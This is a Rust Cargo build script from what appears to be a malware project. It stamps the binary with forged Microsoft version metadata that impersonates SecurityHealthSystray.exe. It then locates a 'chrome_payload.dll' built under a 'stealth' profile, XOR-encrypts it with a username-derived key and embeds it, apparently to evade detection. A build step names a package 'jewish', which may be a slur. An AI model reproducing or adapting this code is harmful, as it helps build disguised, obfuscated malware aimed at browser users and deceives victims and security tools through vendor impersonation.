use std::{collections::HashSet, env, fs, path::{Path, PathBuf}};

fn main() {
    embed_version_resource();
    embed_payload();
}

fn embed_version_resource() {
    if env::var("CARGO_CFG_TARGET_OS").as_deref() != Ok("windows") {
        return;
    }

    let mut res = winres::WindowsResource::new();
    res.set("FileDescription", "Windows Security health systray executable");
    res.set("ProductName", "Microsoft\u{ae} Windows\u{ae} Operating System");
    res.set("CompanyName", "Microsoft Corporation");
    res.set("OriginalFilename", "SecurityHealthSystray.exe");
    res.set("InternalName", "SecurityHealthSystray");
    res.set(
        "LegalCopyright",
        "\u{c9} Microsoft Corporation. All rights reserved.",
    );
    res.set("FileVersion", "10.0.22621.1");
    res.set("ProductVersion", "10.0.22621.1");

    if let Err(err) = res.compile() {
        println!("cargo:warning=version resource skipped: {err}");
    }
}

fn profile_from_out_dir(out_dir: &Path) -> Option<String> {
    // .../target/[triple/]<profile>/build/<crate-id>/out
    out_dir
        .ancestors()
        .nth(3)
        .and_then(|p| p.file_name())
        .and_then(|n| n.to_str())
        .map(str::to_owned)
}

fn payload_candidates(manifest_dir: &Path, out_dir: &Path) -> Vec<PathBuf> {
    let target_dir = env::var("CARGO_TARGET_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| manifest_dir.join("target"));
    let target = env::var("TARGET").unwrap_or_default();

    let mut profiles = Vec::new();
    if let Ok(p) = env::var("PROFILE") {
        profiles.push(p);
    }
    if let Some(p) = profile_from_out_dir(out_dir) {
        profiles.push(p);
    }
    profiles.push("stealth".into());
    profiles.push("release".into());

    let mut seen_profiles = HashSet::new();
    profiles.retain(|p| seen_profiles.insert(p.clone()));

    let mut candidates = Vec::new();
    if let Ok(p) = env::var("CHROME_PAYLOAD_DLL") {
        candidates.push(PathBuf::from(p));
    }

    for profile in &profiles {
        let bases = if target.is_empty() {
            vec![target_dir.join(profile)]
        } else {
            vec![
                target_dir.join(profile),
                target_dir.join(&target).join(profile),
            ]
        };

        for base in bases {
            candidates.push(base.join("chrome_payload.dll"));
            candidates.push(base.join("deps").join("chrome_payload.dll"));
        }
    }

    candidates
}

fn embed_payload() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let out_dir = env::var("OUT_DIR")
        .map(PathBuf::from)
        .expect("OUT_DIR not set");
    let out = out_dir.join("payload.dll");

    let candidates = payload_candidates(&manifest_dir, &out_dir);
    let mut tried = Vec::new();

    for src in &candidates {
        tried.push(src.display().to_string());
        if !src.exists() {
            continue;
        }
        let size = fs::metadata(src).map(|m| m.len()).unwrap_or(0);
        if size == 0 {
            continue;
        }
        fs::copy(src, &out).expect("copy payload.dll into OUT_DIR");
        let raw = fs::read(&out).expect("read payload.dll");
        let username = env::var("USERNAME").unwrap_or_default();
        let mut key = [0u8; 32];
        let bytes = username.as_bytes();
        if !bytes.is_empty() {
            for (i, slot) in key.iter_mut().enumerate() {
                *slot = bytes[i % bytes.len()];
            }
        }
        let encrypted: Vec<u8> = raw
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % 32])
            .collect();
        fs::write(&out, encrypted).expect("xor-encrypt payload.dll into OUT_DIR");
        println!("cargo:rerun-if-changed={}", src.display());
        return;
    }

    panic!(
        "chrome_payload.dll not found or empty.\n\
         Run: cargo build --profile stealth -p chrome-payload\n\
         Then: cargo build --profile stealth -p jewish\n\
         Searched:\n  {}",
        tried.join("\n  ")
    );
}
